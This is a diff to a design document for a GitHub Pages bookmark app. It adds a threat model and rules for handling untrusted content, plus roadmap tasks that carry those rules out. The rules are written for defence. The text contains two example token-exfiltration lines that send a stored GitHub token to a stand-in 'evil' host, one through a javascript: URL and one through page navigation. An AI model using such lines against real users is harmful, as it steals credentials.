@@ -202,6 +202,13 @@ The write queue therefore guarantees:
 
 ## 5. Security Model
 
+**Threat model in one line:** the page is public and that is fine — it ships no credentials.
+The asset worth stealing is the user's PAT, which exists only in their own browser. Every rule
+below protects that one secret, and the fine-grained token scope caps the damage if it leaks.
+
+A stranger opening the app URL sees an empty first-run modal and nothing else. The realistic
+compromise is **script execution on the app's own origin**, covered in §5.1 and §5.4.
+
 ### 5.1 The GitHub Pages Origin Problem
 
 **`username.github.io` is a single origin shared by every project you host there.** Any other
@@ -236,6 +243,44 @@ onboarding flow. Users needing true erasure must rewrite history or start a fres
 
 Client-side AES-GCM encryption (D11) would solve this but forfeits readable diffs and
 Actions-based enrichment. Default is **off**.
+
+### 5.4 Untrusted Content Handling
+
+Almost everything this app renders is attacker-influenceable: URLs and titles come from
+`bookmarks.json`, from imported files (§11, 4b–4c), and from pages scraped by the enrichment
+Action (§13, 6a). Any script execution on this origin reads the PAT out of storage, so these
+rules are load-bearing, not hygiene.
+
+* **URL scheme allowlist — `http:` and `https:` only.** Enforced twice: on save, and again at
+  render time. A bookmark whose URL is `javascript:fetch('https://evil/?t='+sessionStorage.token)`
+  executes in this origin the moment it is clicked. `data:`, `blob:`, `file:` and `vbscript:`
+  are rejected the same way. Rejected URLs are shown as inert text with a warning badge, never
+  as an anchor.
+* **Never `{@html}`.** No value originating from the JSON file, an import, or the enrichment
+  Action may be rendered as raw HTML. Svelte escapes by default; the risk is a single
+  well-meaning exception. Enforced by an ESLint rule in CI, not by discipline.
+* **Sanitize at the import boundary.** Bookmark HTML files are arbitrary attacker input. Parse
+  with `DOMParser` into a detached document, read `textContent` only, strip control characters,
+  and cap field lengths before anything reaches the store.
+* **Treat the enrichment Action as untrusted output.** It scrapes `<title>` and meta tags from
+  arbitrary third-party sites and commits the result into the repo. Strip control characters
+  and cap lengths inside the Action, and validate again on load — the file is not trusted
+  merely because it came from our own workflow.
+* **Minimal dependency surface.** One compromised package with access to the page defeats every
+  other control here. Few dependencies, committed lockfile, `npm ci` in CI, no post-install
+  scripts, and no runtime CDN fetches.
+* **Favicons are images, not trust.** Load them via `img-src`, never inline remote SVG — an
+  inline SVG is a script execution vector.
+
+**What CSP does and does not buy.** The policy in §5.2 blocks `fetch`/XHR to any host but
+`api.github.com`, which is real defence in depth. It does **not** stop exfiltration by
+navigation (`location = 'https://evil/?t=' + token`), and it cannot stop an attacker with
+script execution from vandalising the repo through the endpoint we must allow. CSP raises the
+cost of a compromise; the scheme allowlist and the escaping rules are what prevent one.
+
+**Blast radius if the token leaks anyway:** contents of one private repository — read and
+write. Not the account, not other repositories, not SSH keys, not Actions secrets. That
+containment is the entire reason for the fine-grained scope in §5.2.
 
 ---
 
@@ -294,6 +339,8 @@ with unsynced bookmarks queued means **silent data loss**.
 * [ ] **0f.** Deploy workflow using `actions/upload-pages-artifact` + `actions/deploy-pages`;
   copy `index.html` to `404.html` so client-side routes survive a refresh.
 * [ ] **0g.** CSP meta tag in the app shell, asserted by a CI check.
+* [ ] **0h.** ESLint rule banning `{@html}`, plus a dependency policy — committed
+  lockfile, `npm ci`, no post-install scripts, no runtime CDN fetches (§5.4).
 
 ## 8. Phase 1 — MVP: Connect, Read, Search
 
@@ -306,6 +353,8 @@ with unsynced bookmarks queued means **silent data loss**.
   ranked (title match beats description match).
 * [ ] **1g.** Tag sidebar derived from bookmark membership; click to filter, multi-select.
 * [ ] **1h.** Full error taxonomy (§4.5) surfaced as human-readable states.
+* [ ] **1i.** Render-time URL scheme allowlist (`http:`/`https:`). Anything else renders
+  as inert text with a warning badge, never as a clickable anchor (§5.4).
 
 ## 9. Phase 2 — Write Path
 
@@ -316,6 +365,8 @@ with unsynced bookmarks queued means **silent data loss**.
 * [ ] **2e.** Optimistic UI with rollback on terminal failure.
 * [ ] **2f.** Descriptive commit messages (`feat: add "Title"`, `chore: sync N changes`).
 * [ ] **2g.** Dedupe on add via `urlKey` — offer "update existing" instead of duplicating.
+* [ ] **2h.** Save-time URL validation and field-length caps, sharing one validator with
+  1i so the two boundaries cannot drift apart (§5.4).
 
 ## 10. Phase 3 — Sync & Resilience
 
@@ -340,6 +391,9 @@ with unsynced bookmarks queued means **silent data loss**.
 * [ ] **4d.** Export: Netscape HTML and raw JSON. No lock-in, by design.
 * [ ] **4e.** Bulk dedupe pass over `urlKey` with a review-before-apply UI.
 * [ ] **4f.** Bulk tag operations — rename, merge, delete across the whole collection.
+* [ ] **4g.** Import sanitisation: `DOMParser` into a detached document, `textContent`
+  only, control characters stripped, lengths capped. Fixture-tested against a hostile
+  bookmarks file containing `javascript:` URLs and HTML payloads in titles (§5.4).
 
 ## 12. Phase 5 — Capture Surfaces
 
@@ -361,6 +415,8 @@ runs server-side in the repo itself, which costs nothing and needs no infrastruc
 * [ ] **6b.** Loop guard — the enrichment commit must not retrigger the workflow.
 * [ ] **6c.** Weekly scheduled link checker; flag dead links for review in-app.
 * [ ] **6d.** Optional archival: submit new URLs to the Wayback Machine.
+* [ ] **6e.** Sanitise scraped metadata inside the Action — strip control characters, cap
+  lengths — and re-validate on load. Our own workflow's output is not trusted (§5.4).
 
 ## 14. Phase 7 — UX Polish
 
